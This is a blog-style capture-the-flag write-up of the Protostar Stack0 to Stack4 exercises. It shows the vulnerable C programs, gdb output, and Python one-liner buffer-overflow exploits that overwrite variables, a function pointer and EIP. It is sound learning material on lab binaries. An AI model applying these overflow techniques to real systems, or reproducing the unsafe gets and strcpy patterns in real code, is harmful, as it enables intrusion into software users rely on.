---
layout: post
title:  "Protostar Day One (Stack)"
date:   2020-07-01 01:05:48 +0100
categories: pwn
---
Starting this journey I will be following through the excercises found [here](https://exploit-exercises.lains.space/protostar/).

The first of these challenges are Stack0.

## Stack0.c
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
In this challenge there is a vulnerable gets() call that we can exploit to change the variable "modified" to something that is not 0. To do this we can simply run a python command to send in x number of characters to overwrite the buffer and the modified variable.

### Exploit Code
```
python -c "print 'A' * 76 + 'pwn'" | ./stack0
```

## Stack1.c
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
For this exercise, the goal is to change the "modified" variable to be 0x61626364. Since the buffer is the same, we already know to send 76 characters before we can overwrite the variable.

When writing our A's to the stack, it will be seen that we are writing 0x41414141 (41 = A in hex. Information on the conversions can be found [here](http://www.asciitable.com/)) and if we were to send 80 A's to the program, we will be shown that the variable has the value "0x41414141".

Now we could simply just do this by hand and look for each value 61, 62, 63, 64. Or we could just use the python library "struct".
As seen in the exploit code below, this gives the output dcba. Which, when passed into the program, gives us the correct output.

### Exploit Code
```
>>> import struct
>>> struct.pack("<L",0x61626364)
'dcba'

./stack1 $(python -c "print 'A' * 76 + 'dcba'")



```

## Stack2.c
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
For stack2 the objective is to change the modified variable to be: "0x0d0a0d0a". This challenge is slightly different however as it takes no user input when ran. It gets the input from the envronment variable "GREENIE". If we write a buffer overflow into this variable we can change the "modified" variable to be anything we like.

Again for this example we will just be using python's "struct" and a one-liner to complete.

### Exploit Code
```
>>> struct.pack("<L",0x0d0a0d0a)
'\n\r\n\r'

export GREENIE=$(python -c "print 'A' * 68 + '\n\r\n\r'"); ./stack2
```


## Stack3
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
In this challenge we can learn about redirecting code to reach new code that wasn't originally intended to run. In this case we have the function "win()" as the goal.
To do this challenge, I opened up the binary in gdb (ran the program once to get memory locations) and typed "disassemble win" to view the entry address of the function.

```
gdb-peda$ disassemble win
Dump of assembler code for function win:
   0x08048424 <+0>:	push   ebp
   0x08048425 <+1>:	mov    ebp,esp
   0x08048427 <+3>:	sub    esp,0x18
   0x0804842a <+6>:	mov    DWORD PTR [esp],0x8048540
   0x08048431 <+13>:	call   0x8048360 <puts@plt>
   0x08048436 <+18>:	leave  
   0x08048437 <+19>:	ret    
End of assembler dump.
```

With this memory address: 0x08048424 we can use the buffer overflow to overwrite the fp variable with the address we found and get the code to jump to that location and run whatever is there.

### Exploit Code
```
>>> struct.pack("<L",0x08048424)
'$\x84\x04\x08'

python -c "print 'A' * 64 + '$\x84\x04\x08'" | ./stack3
```

## Stack4
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
This challenge is similar to the other, but in this one we will be overwriting the "EIP" register instead of a variable to get the code to change as we please.

To do this I did the following steps.

```
gdb-peda$ disassemble win
Dump of assembler code for function win:
   0x080483f4 <+0>:	push   ebp
   0x080483f5 <+1>:	mov    ebp,esp
   0x080483f7 <+3>:	sub    esp,0x18
   0x080483fa <+6>:	mov    DWORD PTR [esp],0x80484e0
   0x08048401 <+13>:	call   0x804832c <puts@plt>
   0x08048406 <+18>:	leave  
   0x08048407 <+19>:	ret    
End of assembler dump.
```
```
>>> struct.pack("<L",0x080483f4)
'\xf4\x83\x04\x08'
```

```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

```
[----------------------------------registers-----------------------------------]
EAX: 0xffffd120 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x0 
ECX: 0xf7faa580 --> 0xfbad2288 
EDX: 0xffffd184 --> 0x0 
ESI: 0xf7faa000 --> 0x1dfd6c 
EDI: 0xf7faa000 --> 0x1dfd6c 
EBP: 0x65414149 ('IAAe')
ESP: 0xffffd170 ("AJAAfAA5AAKAAgAA6AAL")
EIP: 0x41344141 ('AA4A')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
```

```
gdb-peda$ pattern offset AA4A
AA4A found at offset: 76
```

### Exploit Code
```

python -c "print 'A' * 76 + '\xf4\x83\x04\x08'" | ./stack4
```